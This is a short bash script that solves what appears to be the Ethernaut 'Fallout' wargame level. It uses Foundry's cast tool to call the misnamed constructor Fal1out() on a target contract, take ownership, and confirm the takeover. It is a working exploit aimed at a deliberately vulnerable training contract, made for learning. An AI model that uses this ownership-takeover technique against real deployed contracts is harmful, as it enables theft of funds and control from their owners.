#!/usr/bin/env bash
set -e

CONTRACT="$1"

[ "$CONTRACT" == "" ] && echo "A contract address must be specified as the first argument" >&2 && exit 1
[ "$ETH_RPC_URL" == "" ] && echo "ETH_RPC_URL not set" >&2 && exit 1
[ "$CHAIN" == "" ] && echo "CHAIN not set" >&2 && exit 1

if [ "$PRIVATE_KEY" == "" ]
then
	echo "Enter private key"
	read -s "PRIVATE_KEY"
fi
PRIVATE_KEY=$(echo $PRIVATE_KEY | sed 's/^0x//')

echo "Calling Fal1out()"
cast send --private-key ${PRIVATE_KEY} \
	--value 1wei \
	${CONTRACT} \
	$(cast sig 'Fal1out()')

NEW_OWNER=0x$(cast call ${CONTRACT} "$(cast sig 'owner()')" | tr -d '\t\n\r\0' | tail -c 40)
echo "New owner: ${NEW_OWNER}"

EXPECTED_OWNER=$(cast wallet address --private-key ${PRIVATE_KEY} | tr [:upper:] [:lower:])

if [ "${NEW_OWNER}" == "${EXPECTED_OWNER}" ]
then
	echo "Level completed, submit instance"
else
	echo "ERROR: Solution failed"
fi
